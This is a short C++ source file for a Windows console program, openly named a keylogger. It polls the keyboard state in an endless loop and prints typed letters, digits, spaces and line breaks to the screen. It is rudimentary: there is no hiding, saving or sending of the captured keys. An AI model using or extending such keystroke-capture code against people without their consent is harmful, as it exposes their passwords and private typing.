// SimpleKeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>

int main() {
	int delay, repeat;
	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &repeat, 0);
	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &delay, 0);

	char numericShift[] = { ')', '!', '\"', '#', '$', '%', '^', '&', '*', '(' };
	for (;;) {
		bool shift = GetKeyState(VK_SHIFT) < 0;
		bool caps = (GetKeyState(VK_CAPITAL) & 1) == 1;

		for (int i = 'A'; i <= 'Z'; i++) {
			if (GetKeyState(i) < 0) {
				printf("%c", (shift ^ caps) ? i : (i | 0x20));
				Sleep(50);
				break;
			}
		}

		if (GetKeyState(VK_SPACE) < 0) {
			printf(" ");
			Sleep(50);
			continue;
		}

		if (GetKeyState(VK_RETURN) < 0) {
			printf("\n");
			Sleep(50);
			continue;
		}

		for (int i = '0'; i <= '9'; i++) {
			if (GetKeyState(i) < 0) {
				printf("%c", shift ? numericShift[i - '0'] : i);
				Sleep(80);
				break;
			}
		}

		Sleep(20);
	}
}

